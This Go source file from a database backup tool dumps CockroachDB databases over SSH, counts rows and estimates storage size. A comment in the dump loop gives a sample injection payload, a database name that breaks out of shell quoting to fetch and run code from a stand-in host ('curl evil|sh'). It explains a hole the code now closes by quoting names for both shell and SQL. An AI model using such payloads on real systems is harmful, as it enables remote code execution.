package borg

import (
	"context"
	"fmt"
	"io"
	"strconv"
	"strings"

	"github.com/danieltamas/fortified/internal/sshx"
)

// cockroachBinary is the full path to the cockroach binary inside the
// official cockroachdb/cockroach image — verified live: a bare
// `docker exec <c> cockroach ...` fails with "executable file not
// found in $PATH" (the image's own entrypoint script sets up PATH,
// which a raw docker exec bypasses), so every invocation here uses
// this path explicitly rather than relying on PATH at all.
const cockroachBinary = "/cockroach/cockroach"

// dumpCockroachDB dumps every real user database in container (CRDB's
// own "system" catalog excluded) via `cockroach dump`, CockroachDB's
// per-database SQL dump command — verified live against a real
// v19.1.5 cluster. Unlike pg_dumpall/mysqldump --all-databases, there
// is no single "dump everything" command, so each database is dumped
// in turn and appended into one file. --insecure only: this is the
// only mode fortified has verified live (see cockroachInsecureReachable
// in internal/discover); a secure cluster requiring client certs isn't
// supported.
func (b Backend) dumpCockroachDB(ctx context.Context, container, dumpPath string, liveOutput io.Writer) (DatabaseManifest, error) {
	databases, err := b.cockroachDatabases(ctx, container)
	if err != nil {
		return DatabaseManifest{}, fmt.Errorf("list databases in %s: %w", container, err)
	}
	if len(databases) == 0 {
		return DatabaseManifest{}, fmt.Errorf("no user databases found in %s (only CRDB's own system catalog)", container)
	}

	// cockroach dump <db> emits table schema/data only — no CREATE
	// DATABASE, and it doesn't record which database it belongs to
	// (unlike pg_dumpall/mysqldump --all-databases, which are self-
	// contained). Concatenating several databases' dumps as-is would
	// load every table into whichever database happens to be the
	// throwaway container's default, silently losing the original
	// per-database split. Prepending CREATE DATABASE/SET database
	// before each segment makes the combined file self-contained,
	// replayable in one shot the same way the other two engines' dumps
	// already are.
	lines := make([]string, len(databases))
	for i, db := range databases {
		redirect := ">>"
		if i == 0 {
			redirect = ">"
		}
		// db comes from a live `SHOW DATABASES` — an operator (or anyone
		// who can create a database on an --insecure cluster) controls
		// its literal text. Verified live this was exploitable: the two
		// %s below were previously interpolated raw into a single-quoted
		// shell string, so a database named e.g. `x'; curl evil|sh #`
		// would break out of printf's quoting and execute arbitrary
		// commands as root over the SSH session at the next backup.
		// shellSingleQuote protects the shell layer; pgQuoteIdent
		// protects the SQL layer (CockroachDB uses the same ANSI
		// double-quote identifier escaping Postgres does) — both are
		// needed since this text is both shell-embedded and SQL.
		preambleText := fmt.Sprintf("CREATE DATABASE IF NOT EXISTS %s;\nSET database = %s;\n", pgQuoteIdent(db), pgQuoteIdent(db))
		preamble := fmt.Sprintf("printf %%s %s", shellSingleQuote(preambleText))
		lines[i] = fmt.Sprintf("{ %s; docker exec %s %s dump --insecure %s; } %s %s",
			preamble, container, cockroachBinary, shellSingleQuote(db), redirect, shellSingleQuote(dumpPath))
	}
	script := strings.Join(lines, " && ")
	// Only bother estimating when someone's actually watching, same as
	// the postgres/mariadb dumps. Best-effort even then: no reliable
	// per-database size query exists for CRDB (see
	// cockroachDatabaseSize's own doc comment), so a failure just means
	// the live progress line omits a percentage.
	var estimatedSize int64
	if liveOutput != nil {
		estimatedSize, _ = b.cockroachDatabaseSize(ctx, container)
	}
	stopProgress := b.startDumpProgressPoller(ctx, container, dumpPath, estimatedSize, liveOutput)
	_, err = b.Runner.Run(ctx, sshx.Mutating, "sh", []string{"-c", script}, sshx.RunOptions{Timeout: sshx.LongRunningTimeout})
	stopProgress()
	if err != nil {
		return DatabaseManifest{}, fmt.Errorf("cockroach dump for %s: %w", container, err)
	}

	sha, err := b.sha256File(ctx, dumpPath)
	if err != nil {
		return DatabaseManifest{}, err
	}
	rowCounts, err := b.cockroachRowCounts(ctx, container, databases)
	if err != nil {
		return DatabaseManifest{}, err
	}
	return DatabaseManifest{Container: container, SHA256: sha, RowCounts: rowCounts}, nil
}

// cockroachDatabases lists every database cockroach dump would need to
// cover — every entry `SHOW DATABASES` reports except CRDB's own
// "system" catalog, which never holds user data.
func (b Backend) cockroachDatabases(ctx context.Context, container string) ([]string, error) {
	out, err := b.cockroachQuery(ctx, container, "", "SHOW DATABASES")
	if err != nil {
		return nil, err
	}
	var databases []string
	for _, name := range skipHeaderLine(out) {
		if name != "system" {
			databases = append(databases, name)
		}
	}
	return databases, nil
}

// cockroachRowCounts counts every table in every real user database —
// mirrors postgresRowCounts' per-database structure (CRDB has no
// single cross-database catalog view either), reusing
// postgresUnionCountQuery/pgQuoteQualifiedIdent since CRDB's SQL
// dialect is postgres-compatible for exactly this query shape
// (verified live).
func (b Backend) cockroachRowCounts(ctx context.Context, container string, databases []string) (map[string]int64, error) {
	counts := make(map[string]int64)
	for _, db := range databases {
		tables, err := b.cockroachTables(ctx, container, db)
		if err != nil {
			return nil, err
		}
		if len(tables) == 0 {
			continue
		}
		qualified := make([]string, len(tables))
		for i, t := range tables {
			qualified[i] = "public." + t
		}
		out, err := b.cockroachQuery(ctx, container, db, postgresUnionCountQuery(qualified))
		if err != nil {
			return nil, fmt.Errorf("count rows in %s/%s: %w", container, db, err)
		}
		dbCounts, err := parseCountLines(container, strings.Join(skipHeaderLine(out), "\n"))
		if err != nil {
			return nil, err
		}
		for table, n := range dbCounts {
			counts[db+"."+table] = n
		}
	}
	return counts, nil
}

// cockroachTables lists db's own tables (CRDB's own catalog schemas
// excluded — "public" is where user tables live, same convention
// postgres uses).
func (b Backend) cockroachTables(ctx context.Context, container, db string) ([]string, error) {
	const listQuery = "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' ORDER BY 1"
	out, err := b.cockroachQuery(ctx, container, db, listQuery)
	if err != nil {
		return nil, fmt.Errorf("list tables in %s/%s: %w", container, db, err)
	}
	return skipHeaderLine(out), nil
}

// cockroachQuery runs one query against container's cockroach cluster,
// --insecure (see dumpCockroachDB's doc comment). database, if
// non-empty, connects to that database instead of the cluster's
// default. cockroach sql's default table output always has a one-line
// header (verified live — there is no direct psql -tA equivalent for
// this old CLI version) — every caller strips it via skipHeaderLine
// rather than depending on an unverified --format flag.
func (b Backend) cockroachQuery(ctx context.Context, container, database, query string) (string, error) {
	args := []string{"exec", container, cockroachBinary, "sql", "--insecure"}
	if database != "" {
		args = append(args, "-d", database)
	}
	args = append(args, "-e", query)
	result, err := b.Runner.Run(ctx, sshx.ReadOnly, "docker", args, sshx.RunOptions{})
	if err != nil {
		return "", err
	}
	return result.Stdout, nil
}

// skipHeaderLine drops cockroach sql's default output's first line
// (the column name(s)) and returns the remaining non-empty lines.
func skipHeaderLine(output string) []string {
	lines := splitNonEmptyLines(output)
	if len(lines) == 0 {
		return nil
	}
	return lines[1:]
}

// cockroachDatabaseSize estimates container's whole-cluster on-disk
// size via du on its data directory — not a per-database breakdown:
// CockroachDB has no per-database directory or file the way postgres/
// mariadb do (one unified distributed storage engine backs every
// database in the cluster), so a single "whole store" number is the
// honest representation, not a simplification. Best-effort: unlike
// postgres/mariadb's size queries, the data directory's exact path
// depends on how the cluster's --store flag was configured, which
// discover doesn't capture — a du failure here degrades to "size
// unknown" (0) rather than blocking the free-space preflight check
// backup depends on, since guessing a wrong path must never itself
// block an otherwise-working backup.
func (b Backend) cockroachDatabaseSize(ctx context.Context, container string) (int64, error) {
	script := fmt.Sprintf(
		"docker exec %[1]s du -sb /var/lib/cockroach 2>/dev/null || docker exec %[1]s du -sb /cockroach/cockroach-data 2>/dev/null || echo 0",
		container)
	result, err := b.Runner.Run(ctx, sshx.ReadOnly, "sh", []string{"-c", script}, sshx.RunOptions{})
	if err != nil {
		return 0, nil //nolint:nilerr // best-effort — see doc comment
	}
	fields := strings.Fields(result.Stdout)
	if len(fields) == 0 {
		return 0, nil
	}
	size, err := strconv.ParseInt(fields[0], 10, 64)
	if err != nil {
		return 0, nil //nolint:nilerr // best-effort — see doc comment
	}
	return size, nil
}

// CockroachClusterSize is cockroachDatabaseSize, exported for
// `fortified status` (see its doc comment for why this is one
// whole-cluster number, not a per-database breakdown).
func (b Backend) CockroachClusterSize(ctx context.Context, container string) (int64, error) {
	return b.cockroachDatabaseSize(ctx, container)
}
